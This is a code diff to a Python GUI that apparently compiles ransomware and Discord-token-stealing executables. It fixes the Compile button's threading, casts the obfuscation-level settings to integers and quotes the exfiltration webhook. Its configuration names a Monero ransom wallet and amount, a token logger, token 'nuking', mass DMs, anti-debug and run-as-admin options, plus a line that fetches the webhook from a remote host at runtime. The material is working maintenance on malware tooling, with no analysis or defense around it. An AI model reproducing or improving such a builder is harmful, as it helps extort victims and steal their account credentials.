@@ -207,7 +207,7 @@ class App(customtkinter.CTk):
         
 
         # Compile Buttom
-        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets)).start)
+        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=lambda: threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets)).start())
         button.grid(row=14, column=7, columnspan=2, sticky="ew")
 
         self.response_label = customtkinter.CTkLabel(master=main_frame, text="", justify='center')
@@ -259,8 +259,8 @@ class App(customtkinter.CTk):
         debug = misc_config['Anti Debug'].get()
         admin = misc_config['Run As Admin'].get()
 
-        self.base = misc_config['Base Obfuscation'].get()
-        self.recursion = misc_config['Obfuscation Level'].get()
+        self.base = int(misc_config['Base Obfuscation'].get())
+        self.recursion = int(misc_config['Obfuscation Level'].get())
 
         self.response_label.configure(text='Compiling To Exe...')
 
@@ -291,7 +291,7 @@ class App(customtkinter.CTk):
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
             "CRYPTO_TYPE": crypto_type,
-            "WEBHOOK": webhook if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
+            "WEBHOOK": f'"{webhook}"' if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
             "MASSDM": massdm,
